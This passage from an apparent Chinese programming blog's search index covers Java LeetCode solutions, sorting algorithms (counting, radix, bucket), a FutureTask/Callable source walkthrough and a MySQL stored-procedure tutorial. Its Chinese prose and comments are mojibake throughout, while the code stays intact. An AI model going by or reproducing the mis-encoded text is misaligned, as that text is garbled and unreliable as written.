C.add(A.get(A.size() - 1)); A.remove(A.size() - 1); // æŠŠBç»è¿‡è¾…åŠ©Aæ”¾åˆ°Cä¸Š move(n - 1, B, A, C); } } } /** * å®ç°äºŒ * @param n å¤šå°‘ä¸ªç›˜å­ * @param a æŸ±å­A * @param b æŸ±å­B * @param c æŸ±å­C */ void move1(int n, char a, char b, char c) { if (n == 1) { System.out.println(String.format(\u0026#34;%s-\u0026gt;%s\u0026#34;,a,c)); } else { move1(n-1, a, c, b); System.out.println(String.format(\u0026#34;%s-\u0026gt;%s\u0026#34;,a,c)); move1(n-1, b, a, c); } } LeetCode ç¬¬ 91 é¢˜\r#\ré¢˜ç›®\nä¸€æ¡åŒ…å«å­—æ¯ A-Z çš„æ¶ˆæ¯é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œäº†ç¼–ç ï¼š \u0026#39;A\u0026#39; -\u0026gt; 1 \u0026#39;B\u0026#39; -\u0026gt; 2 ... \u0026#39;Z\u0026#39; -\u0026gt; 26 ç»™å®šä¸€ä¸ªåªåŒ…å«æ•°å­—çš„éç©ºå­—ç¬¦ä¸²ï¼Œè¯·è®¡ç®—è§£ç æ–¹æ³•çš„æ€»æ•°ã€‚ ç¤ºä¾‹: è¾“å…¥: \u0026#34;226\u0026#34; è¾“å‡º: 3 è§£é‡Š: å®ƒå¯ä»¥è§£ç ä¸º \u0026#34;BZ\u0026#34; (2 26), \u0026#34;VF\u0026#34; (22 6), æˆ–è€… \u0026#34;BBF\u0026#34; (2 2 6) ã€‚ æ€è·¯ 1ã€dp[i]çš„ç»“æœä¸dp[i-1]å’Œdp[i-2]æœ‰å…³ï¼Œå³åœ¨æ»¡è¶³æ¡ä»¶ä¸‹dp[i]=dp[i-1]+dp[i-2]ã€‚ 2ã€æ ¹æ®é¢˜æ„ï¼Œæœ‰å¦‚ä¸‹æƒ…å†µï¼š\ns[0]=\u0026lsquo;0\u0026rsquo;æ—¶ï¼Œç›´æ¥return 0; s[i]=\u0026lsquo;0\u0026rsquo;æ—¶ï¼Œè‹¥s[i-1]=1æˆ–è€…s[i-1]=2ï¼Œåˆ™dp[i]=dp[i-2]ï¼Œå¦åˆ™return 0; s[i-1]=\u0026lsquo;1\u0026rsquo;æ—¶ï¼Œåˆ™dp[i]=dp[i-1]+dp[i-2] s[i-1]=\u0026lsquo;2\u0026rsquo;æ—¶ï¼Œè‹¥'0\u0026rsquo;\u0026lt;s[i]\u0026lt;\u0026lsquo;6\u0026rsquo;ï¼Œåˆ™dp[i]=dp[i-1]+dp[i-2] Javaä»£ç \npublic class LeetCode91 { public static void main(String[] args) { String str = \u0026#34;11129382827\u0026#34;; int i = new LeetCode91().numDecodings(str); System.out.println(i); } public int numDecodings(String str) { char[] chars = str.toCharArray(); if (chars[0] == \u0026#39;0\u0026#39;) return 0; int pre1 = 1,pre2 = 1, curr = 1; for (int i = 1; i \u0026lt; chars.length; i++) { // s[i]=\u0026#39;0\u0026#39;æ—¶ï¼Œè‹¥s[i-1]=1æˆ–è€…s[i-1]=2ï¼Œåˆ™dp[i]=dp[i-2]ï¼Œå¦åˆ™return 0; if (chars[i] == \u0026#39;0\u0026#39;) { if (chars[i-1] == \u0026#39;1\u0026#39; || chars[i-1] == \u0026#39;2\u0026#39;) { curr = pre1; } else return 0; } // s[i-1]=\u0026#39;1\u0026#39;æ—¶ï¼Œåˆ™dp[i]=dp[i-1]+dp[i-2] else if (chars[i-1] == \u0026#39;1\u0026#39;) { curr = pre1 + pre2; } // s[i-1]=\u0026#39;2\u0026#39;æ—¶ï¼Œè‹¥\u0026#39;0\u0026#39;\u0026lt;s[i]\u0026lt;\u0026#39;6\u0026#39;ï¼Œåˆ™dp[i]=dp[i-1]+dp[i-2] else if (chars[i-1] == \u0026#39;2\u0026#39; \u0026amp;\u0026amp; chars[i] \u0026lt;= \u0026#39;6\u0026#39;) { curr = pre1 + pre2; } pre1 = pre2; pre2 = curr; } return curr; } } LeetCode ç¬¬ 247 é¢˜\r#\ré¢˜ç›®\nä¸­å¿ƒå¯¹ç§°æ•°æ˜¯æŒ‡ä¸€ä¸ªæ•°å­—åœ¨æ—‹è½¬äº† 180 åº¦ä¹‹åçœ‹èµ·æ¥ä¾æ—§ç›¸åŒçš„æ•°å­—ï¼ˆæˆ–è€…ä¸Šä¸‹é¢ å€’åœ°çœ‹ï¼‰ã€‚ æ‰¾åˆ°æ‰€æœ‰é•¿åº¦ä¸º n çš„ä¸­å¿ƒå¯¹ç§°æ•°ã€‚ ç¤ºä¾‹ : è¾“å…¥: n = 2 è¾“å‡º: [\u0026#34;11\u0026#34;,\u0026#34;69\u0026#34;,\u0026#34;88\u0026#34;,\u0026#34;96\u0026#34;] æ€è·¯ 1ã€å¯¹ç§°ï¼š0|0ï¼Œ1|1ï¼Œ6|9ï¼Œ8|8 2ã€ä¸ä»¥0å¼€å¤´ï¼Œè®¾ç½®ä¸€ä¸ªmå˜é‡ä»¥æ§åˆ¶0ä¸åŠ åœ¨æœ€å¤–å±‚\nJavaä»£ç \npublic class LeetCode247 { public static void main(String[] args) { List\u0026lt;String\u0026gt; strings = new LeetCode247().searchSymmetry(3,3); System.out.println(strings); } public List\u0026lt;String\u0026gt; searchSymmetry(int n, int m) { if (n == 0) { return new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;\u0026#34;)); } if (n == 1) { return new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;8\u0026#34;)); } List\u0026lt;String\u0026gt; str = searchSymmetry(n-2, m); List\u0026lt;String\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); for(int i = 0; i \u0026lt; str.size(); i++){ String s = str.get(i); // ä¸æŠŠ0åŠ åœ¨æœ€å¤–å±‚ if (n != m) { res.add(\u0026#34;0\u0026#34; + s + \u0026#34;0\u0026#34;); } res.add(\u0026#34;1\u0026#34; + s + \u0026#34;1\u0026#34;); res.add(\u0026#34;6\u0026#34; + s + \u0026#34;9\u0026#34;); res.add(\u0026#34;8\u0026#34; + s + \u0026#34;8\u0026#34;); res.add(\u0026#34;9\u0026#34; + s + \u0026#34;6\u0026#34;); } return res; } } LeetCode ç¬¬ 39 é¢˜\r#\ré¢˜ç›®\nç»™å®šä¸€ä¸ªæ— é‡å¤å…ƒç´ çš„æ•°ç»„Â candidatesÂ å’Œä¸€ä¸ªç›®æ ‡æ•°Â targetÂ ï¼Œæ‰¾å‡ºÂ candidatesÂ ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸ºÂ targetÂ çš„ç»„åˆã€‚ candidatesÂ ä¸­çš„æ•°å­—å¯ä»¥æ— é™åˆ¶é‡å¤è¢«é€‰å–ã€‚ è¯´æ˜ï¼š æ‰€æœ‰æ•°å­—ï¼ˆåŒ…æ‹¬Â targetï¼‰éƒ½æ˜¯æ­£æ•´æ•°ã€‚ è§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„ç»„åˆã€‚Â ç¤ºä¾‹Â ï¼š è¾“å…¥ï¼šcandidates = [2,3,6,7], target = 7, æ‰€æ±‚è§£é›†ä¸ºï¼š [ [7], [2,2,3] ] æ€è·¯\nJavaä»£ç \npublic class LeetCode39 { public static void main(String[] args) { int[] candidates = {2,3,6,7}; int target = 7; List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; lists = new LeetCode39().combinationSum(candidates, target); for (int i = 0; i \u0026lt; lists.size(); i++) { System.out.println(lists.get(i)); } } public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinationSum(int[] candidates, int target) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); helper(candidates, target,0, new ArrayList\u0026lt;\u0026gt;(), res); return res; } /** * @param candidates åŸæ•°ç»„ * @param target ç›®æ ‡å¤§å° * @param start å¼€å§‹è¿­ä»£ * @param tmp æ­£åœ¨è¿›è¡ŒæŸ¥æ‰¾çš„é›†åˆ * @param res æ¥æ”¶æ‰¾åˆ°çš„æ•°é›†åˆ */ private void helper(int[] candidates, int target, int start, List\u0026lt;Integer\u0026gt; tmp, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res) { int count = 0; for (int i = 0; i \u0026lt; tmp.size(); i++) { Integer integer = tmp.get(i); count += integer; } for (int i = start; i \u0026lt; candidates.length; i++) { ArrayList\u0026lt;Integer\u0026gt; objects = new ArrayList\u0026lt;\u0026gt;(); objects.addAll(tmp); objects.add(candidates[i]); if (count + candidates[i] == target) { res.add(objects); } else if (count + candidates[i] \u0026lt; target) { helper(candidates, target, i, objects, res); } } } } LeetCode ç¬¬ 51 é¢˜ï¼ˆçš‡åé—®é¢˜ï¼‰\r#\ré¢˜ç›®\nn çš‡åé—®é¢˜ç ”ç©¶çš„æ˜¯å¦‚ä½•å°† n ä¸ªçš‡åæ”¾ç½®åœ¨ nÃ—n çš„æ£‹ç›˜ä¸Šï¼Œå¹¶ä¸”ä½¿çš‡åå½¼æ­¤ä¹‹é—´ä¸èƒ½ç›¸äº’æ”»å‡»ã€‚ ç»™å®šä¸€ä¸ªæ•´æ•° nï¼Œè¿”å›æ‰€æœ‰ä¸åŒçš„Â nÂ çš‡åé—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚ æ¯ä¸€ç§è§£æ³•åŒ…å«ä¸€ä¸ªæ˜ç¡®çš„Â n çš‡åé—®é¢˜çš„æ£‹å­æ”¾ç½®æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆä¸­ \u0026#39;Q\u0026#39; å’Œ \u0026#39;.\u0026#39; åˆ†åˆ«ä»£è¡¨äº†çš‡åå’Œç©ºä½ã€‚ è¾“å…¥: 4 è¾“å‡º: [ [\u0026#34;.Q..\u0026#34;, // è§£æ³• 1 \u0026#34;...Q\u0026#34;, \u0026#34;Q...\u0026#34;, \u0026#34;..Q.\u0026#34;], [\u0026#34;..Q.\u0026#34;, // è§£æ³• 2 \u0026#34;Q...\u0026#34;, \u0026#34;...Q\u0026#34;, \u0026#34;.Q..\u0026#34;] ] è§£é‡Š: 4 çš‡åé—®é¢˜å­˜åœ¨ä¸¤ä¸ªä¸åŒçš„è§£æ³•ã€‚ æ€è·¯\nJavaä»£ç \nå¾…åš..... "},{"id":77,"href":"/posts/history/%E5%BE%AE%E6%9C%8D%E5%8A%A1/","title":"å¾®æœåŠ¡","section":"æˆ‘çš„åšå®¢","content":"\råŸºæœ¬ç»„ä»¶\r#\ræ³¨å†Œä¸­å¿ƒ\r#\rSpring Cloud Eureka\næœåŠ¡è°ƒç”¨\r#\rSpring Cloud Ribbon Spring Cloud Feign\næœåŠ¡ç†”æ–­\r#\rSpring Cloud Hystrix\né…ç½®ä¸­å¿ƒ\r#\rSpring Cloud Config\næœåŠ¡æ€»çº¿\r#\rSpring Cloud Bus\næœåŠ¡ç½‘å…³\r#\rSpring Cloud Zuul\nåˆ†å¸ƒå¼é”\r#\råˆ†å¸ƒå¼äº‹åŠ¡\r#\råˆ†å¸ƒå¼ç¼“å­˜\r#\råˆ†å¸ƒå¼Session\r#\rå¾…ç»§\u0026hellip;\u0026hellip;\n"},{"id":78,"href":"/posts/history/%E6%A1%B6%E6%8E%92%E5%BA%8F/","title":"æ¡¶æ’åº","section":"æˆ‘çš„åšå®¢","content":"\rè®¡æ•°æ’åº\r#\rè§£é¢˜æ€è·¯ 1ã€å–å‡ºæ•°ç»„ä¸­çš„æœ€å¤§å€¼ã€‚ 2ã€ä»¥ï¼ˆæœ€å¤§å€¼ +1ï¼‰ä½œä¸ºè¾…åŠ©æ•°ç»„å¤§å°è¿›è¡Œè®°å½•æ•°ç»„ä¿¡æ¯ã€‚ 3ã€é‡æ–°æŠŠè¾…åŠ©æ•°ç»„ä¸­çš„æ•°æ®è½¬å›æ•°ç»„ä¸­ã€‚\nJavaä»£ç \npublic void countSort(int[] arr) { // è®¾ç½®æœ€å¤§å€¼å˜é‡å¹¶æ‰¾å‡º int max = arr[0]; for (int i = 1; i \u0026lt; arr.length; i++) { if (max \u0026lt; arr[i]) { max = arr[i]; } } // è®¾ç½®è¾…åŠ©æ•°ç»„ int[] tmp = new int[max+1]; // å°†æ•°æ®ä¿å­˜åˆ°è¾…åŠ©æ•°ç»„ä¸­ for (int i = 0; i \u0026lt; arr.length; i++) { tmp[arr[i]]++; } // ä»è¾…åŠ©æ•°ç»„ä¸­æ•°æ®è½¬åˆ°æ•°ç»„ä¸­ int index = 0; for (int i = 0; i \u0026lt; tmp.length; ) { if (tmp[i] == 0) { i++; } else { arr[index] = i; tmp[i]--; index++; } } } åŸºæ•°æ’åº\r#\rè§£é¢˜æ€è·¯ 1ã€å…ˆå¯¹æ•°çš„ä¸ªä½æ•°è¿›è¡Œæ’åºï¼ˆæ”¾åˆ°10ä¸ªæ¡¶ä¸­0-9ï¼‰ 2ã€å°†æ’å¥½çš„æ•°æ®é‡æ–°æ”¾å›åŸæ•°ç»„ä¸­ 3ã€å†å¯¹æ•°çš„ä¸‹ä¸€ä¸ªä½æ•°è¿›è¡Œæ’åºï¼ˆåŒç†1ï¼‰ 4ã€å…¨éƒ¨ä½æ•°æ’åºåå°±okäº†\nJavaä»£ç \npublic class RadixSort { public static void main(String[] args) { int[] array = {0,2,11,3,1,5,9,8,7}; new RadixSort().radixSort(array); System.out.println(Arrays.toString(array)); } public void radixSort(int[] array) { int max = getMax(array); int bit = 1; while(max / bit \u0026gt; 0) { radix(array, bit); bit *= 10; } } private void radix(int[] array, int bit) { // ç”¨æ¥è£…å¯¹åº”ä½æ•°æ•°æ® int[][] tmp = new int[10][array.length]; // ç”¨äºä¿å­˜ä½æ•°ä¸ªæ•° int[] tmpIndex = new int[10]; // è¿›è¡Œä½æ•°æ’åº for (int i = 0; i \u0026lt; array.length; i++) { int num =(array[i] / bit) % 10; tmp[num][tmpIndex[num]] = array[i]; tmpIndex[num]++; } // å°†ä½æ•°æ’åºé‡æ–°èµ‹å€¼å›åŸæ•°ç»„ int arrayIndex = 0; for (int i = 0; i \u0026lt; tmp.length; i++) { for (int j = 0; j \u0026lt; tmpIndex[i]; j++) { array[arrayIndex++] = tmp[i][j]; } } } private int getMax(int[] array) { int max = array[0]; for(int i = 1; i \u0026lt; array.length; i++){ if(array[i] \u0026gt; max) { max = array[i]; } } return max; } } æ¡¶æ’åº\r#\rè§£é¢˜æ€è·¯\n1ã€å…ˆå°†æ•°ç»„åˆ’åˆ†æˆå‡ ä¸ªæ¡¶ 2ã€å°†æ•°ç»„ä¸­çš„æ•°æ®æ”¾åˆ°å¯¹åº”çš„æ¡¶ä¸­ 3ã€å¯¹æ¡¶ä¸­çš„æ•°æ®è¿›è¡Œæ’åº 4ã€å°†æ¡¶ä¸­çš„æ•°ç»„è¿›è¡Œåˆå¹¶åˆ°åŸæ•°ç»„ä¸Š\nè®¡ç®—æ”¾åœ¨å“ªä¸ªæ¡¶ï¼š(arr[i]- min) / ((max-min) / (bucketNum - 1));\nJavaä»£ç \npublic class BucketSort { public static void main(String[] args) { double[] arr = {0.1,0.6,0.3,0.9,0.2}; new BucketSort().bucketSort(arr, 6); System.out.println(Arrays.toString(arr)); } /** * [0,1)ä¹‹é—´çš„æ•°è¿›è¡Œæ’åº * @param arr æ•°ç»„ * @param bucketSize æ¡¶å¤§å° */ private void bucketSort(double[] arr, int bucketSize) { List\u0026lt;Double\u0026gt;[] bucket = new ArrayList[bucketSize]; for (int i = 0; i \u0026lt; bucketSize; i++) { bucket[i] = new ArrayList\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; arr.length; i++) { int num = (int) Math.floor(bucketSize * arr[i]); bucket[num].add(Double.valueOf(arr[i])); } int arrIndex = 0; for (int i = 0; i \u0026lt; bucketSize; i++) { Collections.sort(bucket[i]); for (int j = 0; j \u0026lt; bucket[i].size(); j++) { arr[arrIndex++] = bucket[i].get(j); } } } } "},{"id":79,"href":"/posts/history/callable%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E6%BA%90%E7%A0%81/","title":"Callableè¿”å›å€¼çš„æºç ","section":"æˆ‘çš„åšå®¢","content":"åˆ†æä¸€ä¸‹Callableæ˜¯å¦‚ä½•æ‹¿åˆ°è¿”å›å€¼çš„\ncallable æ˜¯å¦‚ä½•ä¿å­˜è¿”å›å€¼\r#\r1ã€å…ˆå†™ä¸€ä¸ªcallableæµ‹è¯•ç±»\npublic static void main(String[] args) throws ExecutionException, InterruptedException { ExecutorService pool = Executors.newCachedThreadPool(); Future\u0026lt;String\u0026gt; result = pool.submit(() -\u0026gt; { return \u0026#34;Callable Test\u0026#34;; }); System.out.println(result.get()); } 2ã€çœ‹ä¸€ä¸‹submitæ–¹æ³•æœ‰ä»€ä¹ˆ\npublic \u0026lt;T\u0026gt; Future\u0026lt;T\u0026gt; submit(Callable\u0026lt;T\u0026gt; task) { if (task == null) throw new NullPointerException(); RunnableFuture\u0026lt;T\u0026gt; ftask = newTaskFor(task); execute(ftask); return ftask; } æ„å»ºä¸€ä¸ª RunnableFuture å¯¹è±¡ï¼Œé€šè¿‡AbstractExecutorServiceçš„executeæ–¹æ³•æ¥æ‰§è¡Œï¼Œé‚£ä¹ˆè¿”å›å€¼çš„è·å–æ“ä½œåº”è¯¥å°±åœ¨RunnableFutureå¯¹è±¡é‡Œäº†ï¼Œæ‰§è¡Œçš„æ–¹æ³•æ˜¯run()ã€‚\n3ã€å†æ·±å…¥æŸ¥çœ‹newTaskFor(task)æ–¹æ³•\nprotected \u0026lt;T\u0026gt; RunnableFuture\u0026lt;T\u0026gt; newTaskFor(Callable\u0026lt;T\u0026gt; callable) { return new FutureTask\u0026lt;T\u0026gt;(callable); } å‘ç°ä»–å®é™…æ˜¯æ„å»ºäº†ä¸€ä¸ª FutureTask(callable) å¯¹è±¡ï¼ŒæŠŠæˆ‘ä»¬åˆ›å»ºçš„callableå¯¹è±¡ä¼ è¿›å»ã€‚\n4ã€é‚£æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå¯¹è±¡çš„run()æ–¹æ³•\npublic void run() { if (state != NEW || !UNSAFE.compareAndSwapObject(this, runnerOffset, null, Thread.currentThread())) return; try { Callable\u0026lt;V\u0026gt; c = callable; if (c != null \u0026amp;\u0026amp; state == NEW) { V result; boolean ran; try { result = c.call(); //æ‰§è¡Œçº¿ç¨‹ï¼Œè·å–ç»“æœ ran = true; } catch (Throwable ex) { result = null; //æœ‰å¼‚å¸¸ï¼Œç»“æœè®¾ç½®ä¸ºç©º ran = false; setException(ex); } if (ran) set(result); //è®¾ç½®ä¿å­˜ç»“æœ } } finally { // runner must be non-null until state is settled to // prevent concurrent calls to run() runner = null; // state must be re-read after nulling runner to prevent // leaked interrupts int s = state; if (s \u0026gt;= INTERRUPTING) handlePossibleCancellationInterrupt(s); } } 5ã€å†çœ‹çœ‹set()æ–¹æ³•\nprotected void set(V v) { if (UNSAFE.compareAndSwapInt(this, stateOffset, NEW, COMPLETING)) { outcome = v; UNSAFE.putOrderedInt(this, stateOffset, NORMAL); // final state finishCompletion(); } } æŠŠçº¿ç¨‹æ‰§è¡Œç»“æœé€šè¿‡set()è¿›è¡Œä¿å­˜ï¼Œä¿å­˜åœ¨outcome å˜é‡ä¸­\nè·å–callableè¿”å›å€¼\r#\rä¸»è¦æ˜¯çœ‹çœ‹é€šè¿‡Future æ˜¯æ€æ ·è·å–callableå€¼çš„\n1ã€ä¸»è¦æ˜¯çœ‹FutureTask get()æ–¹æ³•\n// æ²¡æœ‰è®¾ç½®ç­‰å¾…æ—¶é—´ public V get() throws InterruptedException, ExecutionException { int s = state; if (s \u0026lt;= COMPLETING) //çº¿ç¨‹æ²¡æœ‰æ‰§è¡Œå®Œ s = awaitDone(false, 0L); //é˜»å¡ç­‰å¾… return report(s); } //è®¾ç½®ç­‰å¾…æ—¶é—´ public V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException { if (unit == null) throw new NullPointerException(); int s = state; if (s \u0026lt;= COMPLETING \u0026amp;\u0026amp; (s = awaitDone(true, unit.toNanos(timeout))) \u0026lt;= COMPLETING) throw new TimeoutException(); return report(s); } 2ã€awaitDoneæ–¹æ³•\nprivate int awaitDone(boolean timed, long nanos) throws InterruptedException { final long deadline = timed ? System.nanoTime() + nanos : 0L; FutureTask.WaitNode q = null; boolean queued = false; for (;;) { if (Thread.interrupted()) { removeWaiter(q); throw new InterruptedException(); } int s = state; if (s \u0026gt; COMPLETING) { if (q != null) q.thread = null; return s; } else if (s == COMPLETING) // cannot time out yet Thread.yield(); else if (q == null) q = new FutureTask.WaitNode(); else if (!queued) queued = UNSAFE.compareAndSwapObject(this, waitersOffset, q.next = waiters, q); else if (timed) { nanos = deadline - System.nanoTime(); if (nanos \u0026lt;= 0L) { removeWaiter(q); return state; } LockSupport.parkNanos(this, nanos); } else LockSupport.park(this); } } é€šè¿‡è‡ªæ—‹ç­‰å¾…çº¿ç¨‹çš„æ‰§è¡Œå®Œï¼Œè¿”å›å€¼\n"},{"id":80,"href":"/posts/history/mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/","title":"My Sqlå­˜å‚¨è¿‡ç¨‹","section":"æˆ‘çš„åšå®¢","content":"å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQLè¯­å¥é›†ï¼Œç»ç¼–è¯‘åˆ›å»ºå¹¶ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å®šå‚æ•°æ¥è°ƒç”¨æ‰§è¡Œã€‚\nåˆ›å»ºå­˜å‚¨è¿‡ç¨‹åŸºæœ¬æ ¼å¼\r#\rCREATE [DEFINER = { user | CURRENT_USER }] PROCEDURE sp_name ([proc_parameter[,...]]) [characteristic ...] routine_body proc_parameter: [ IN | OUT | INOUT ] param_name type characteristic: COMMENT \u0026#39;string\u0026#39; | LANGUAGE SQL | [NOT] DETERMINISTIC | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } routine_body: Valid SQL routine statement [begin_label:] BEGIN [statement_list] â€¦â€¦ END [end_label] ä½¿ç”¨userè¡¨æ¥åšæµ‹è¯•\r#\rCREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL, `age` int(5) DEFAULT NULL, `tag` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„å­˜å‚¨è¿‡ç¨‹\r#\rcreate PROCEDURE select_user(IN user_id INTEGER) BEGIN select * from user where id = user_id; --åˆ†å·ä¸å¯å°‘ END; --åˆ†å·ä¸å¯å°‘ select_useræ˜¯åˆ›å»ºä¸€ä¸ªåç§°ä¸ºselect_userçš„å­˜å‚¨è¿‡ç¨‹ã€‚ IN user_id INTEGERæ˜¯è®¾ç½®ä¸€ä¸ªuser_idçš„å‚æ•°ï¼Œç±»å‹ä¸ºæ•´æ•°ã€‚ è¿‡ç¨‹ä½“æ ¼å¼ï¼šä»¥BEGINå¼€å§‹ï¼ŒENDç»“æŸï¼Œå¯åµŒå¥—åˆ›å»ºã€‚ ä¸ºäº†é¿å…å­˜å‚¨è¿‡ç¨‹ä¸­åˆ†å·(\u0026quot;;\u0026quot;)ç»“æŸè¯­å¥ï¼Œæˆ‘ä»¬ä½¿ç”¨åˆ†éš”ç¬¦å‘Šè¯‰mysqlè§£é‡Šå™¨,è¯¥æ®µå‘½ä»¤æ˜¯å¦å·²ç»ç»“æŸäº†ã€‚\ndelimiter $ [æ•°æ®åº“è¯­å¥/å­˜å‚¨è¿‡ç¨‹è¯­å¥] $ delimiter ; --ç”¨å®Œè®°å¾—ä¿®æ”¹å›æ¥ æ‰§è¡Œä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹\r#\rcall select_user(5); select_useræ˜¯è¦æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹çš„åç§° 5æ˜¯å‚æ•° åˆ é™¤å­˜å‚¨è¿‡ç¨‹\r#\rDROP PROCEDURE IF EXISTS porcedureName; å­˜å‚¨è¿‡ç¨‹å˜é‡INã€OUTã€INTOUTçš„ä½¿ç”¨\r#\råˆ›å»ºä¸€ä¸ªå¸¦æœ‰IN,OUT,INOUTå‚æ•°çš„å­˜å‚¨è¿‡ç¨‹ï¼ŒINè¾“å…¥ç”¨æˆ·çš„ID user_id,INOUTæ˜¯å€¼å…¥ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼ŒåŠ ä¸€åå›è°ƒï¼ŒOUTæ˜¯è¾“å‡ºå¯¹åº”ç”¨æˆ·çš„å¹´é¾„ã€‚\ncreateÂ procedureÂ paramcter_test(Â in user_id int,Â inoutÂ tmp int,Â outÂ user_age int )Â BEGINÂ selectÂ ageÂ INTOÂ user_age fromÂ user where id = user_id;Â set tmp = tmp + 1; END;Â INï¼šæ˜¯è¾“å…¥åˆ°å­˜å‚¨è¿‡ç¨‹ä¸­ã€‚ INOUTï¼šæ˜¯å¯ä»¥è¾“å…¥åˆ°å­˜å‚¨è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥ä»å­˜å‚¨è¿‡ç¨‹ä¸­æ¥æ”¶æ•°å€¼ã€‚ OUTï¼šæ˜¯æ¥æ”¶å­˜å‚¨è¿‡ç¨‹çš„å€¼åˆ°å¤–éƒ¨å˜é‡ä¸­ã€‚ ageÂ INTOÂ user_ageæ˜¯å°†ageçš„å€¼è®¾ç½®åˆ°å˜é‡user_ageä¸­ã€‚ æµ‹è¯•å¹¶æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹\n// è®¾ç½®ä¸‰ä¸ªå‚æ•° set @user_id=5; set @tmp=1; set @user_age=0; //æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ call paramcter_test(@user_id,@tmp,@user_age); //æŸ¥çœ‹å‚æ•°ç»“æœ select @user_id; select @tmp; select @user_age; MySQLå­˜å‚¨è¿‡ç¨‹çš„æ§åˆ¶è¯­å¥\r#\rå˜é‡ä½œç”¨åŸŸ\r#\rè®¾ç½®å±€éƒ¨å˜é‡,åˆ›å»ºä¸€ä¸ªå±€éƒ¨å˜é‡x1ï¼Œå¤§å°varchar(1)ï¼Œé»˜è®¤å€¼æ˜¯outerã€‚ setæ˜¯ä¸ºå˜é‡èµ‹å€¼ã€‚\nbegin declare x1 varchar(5) default \u0026#39;outer\u0026#39;; set x1=\u0026#39;yes\u0026#39;; end; æ¡ä»¶è¯­å¥\r#\r1ã€f-then-else è¯­å¥\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc2(IN parameter int) -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=parameter+1; -\u0026gt; if var=0 then -\u0026gt; insert into t values(17); -\u0026gt; end if; -\u0026gt; if parameter=0 then -\u0026gt; update t set s1=s1+1; -\u0026gt; else -\u0026gt; update t set s1=s1+2; -\u0026gt; end if; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 2ã€caseè¯­å¥\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc3 (in parameter int) -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=parameter+1; -\u0026gt; case var -\u0026gt; when 0 then -\u0026gt; insert into t values(17); -\u0026gt; when 1 then -\u0026gt; insert into t values(18); -\u0026gt; else -\u0026gt; insert into t values(19); -\u0026gt; end case; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 3ã€while Â·Â·Â·Â· end while\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc4() -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=0; -\u0026gt; while var\u0026lt;6 do -\u0026gt; insert into t values(var); -\u0026gt; set var=var+1; -\u0026gt; end while; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 4ã€repeatÂ·Â·Â·Â· end repeat\nrepeat --å¾ªç¯ä½“ until å¾ªç¯æ¡ä»¶ end repeat; mysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc5 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; repeat -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; until v\u0026gt;=5 -\u0026gt; end repeat; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 5ã€loop Â·Â·Â·Â·Â·endloop\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc6 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; LOOP_LABLE:loop -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; if v \u0026gt;=5 then -\u0026gt; leave LOOP_LABLE; -\u0026gt; end if; -\u0026gt; end loop; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 6ã€ITERATEè¿­ä»£\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc10 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; LOOP_LABLE:loop -\u0026gt; if v=3 then -\u0026gt; set v=v+1; -\u0026gt; ITERATE LOOP_LABLE; -\u0026gt; end if; -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; if v\u0026gt;=5 then -\u0026gt; leave 